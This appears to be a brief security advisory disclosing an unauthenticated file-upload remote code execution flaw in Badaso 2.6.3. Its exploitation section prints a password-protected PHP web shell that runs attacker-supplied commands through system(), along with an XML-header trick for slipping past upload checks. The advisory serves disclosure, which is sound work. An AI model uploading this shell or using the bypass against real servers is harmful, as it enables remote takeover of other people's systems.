## Description

Badaso version 2.6.3 allows an unauthenticated remote attacker to
execute arbitrary code remotely on the server. This is possible
because the application does not properly validate the data uploaded
by users.

## Vulnerability

This vulnerability occurs because the application does not correctly
validate files uploaded by users. Thanks to this, we uploaded a file
with malicious PHP code, instead of an image file.

## Exploitation

To exploit this vulnerability, the following file must be sent to the
server:

### exploit.php

```php
<?xml version="1.0" standalone="no"?>
<?php
    if($_POST && $_POST['password']==="AGSH635479302H235") {
        echo system($_POST['cmd']);
    }
?>
```

It is important to put an XML header before the malicious code to
bypass security controls.
